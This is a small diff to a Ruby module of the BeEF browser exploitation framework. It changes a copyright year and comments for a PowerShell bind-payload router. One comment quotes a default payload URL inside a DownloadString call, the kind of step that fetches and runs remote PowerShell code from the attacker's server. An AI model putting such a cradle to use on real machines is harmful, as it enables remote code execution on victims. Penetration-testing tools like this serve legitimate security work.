@@ -1,5 +1,5 @@
 #
-# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+# Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 # Browser Exploitation Framework (BeEF) - http://beefproject.com
 # See the file 'doc/COPYING' for copying permission
 #
@@ -16,7 +16,7 @@ module BeEF
       # Change the default payload URL (DownloadString('http://172.16.37.1/ps/ps.png'))) with your BeEF server and powershell URL settings.
       # By default powershell will be served from http://beef_server:beef_port/ps/ps.png
       #
-      # NOTE: make sure you change the 'host' variable in the main BeEF config.yaml from 0.0.0.0 to the specific IP where BeEF is binded to,
+      # NOTE: make sure you change the 'beef.http.public' variable in the main BeEF config.yaml to the specific IP where BeEF is binded to,
       # and also the powershell-related variable in extensions/social_engineering/config.yaml
       class Bind_powershell < BeEF::Core::Router::Router
         before do
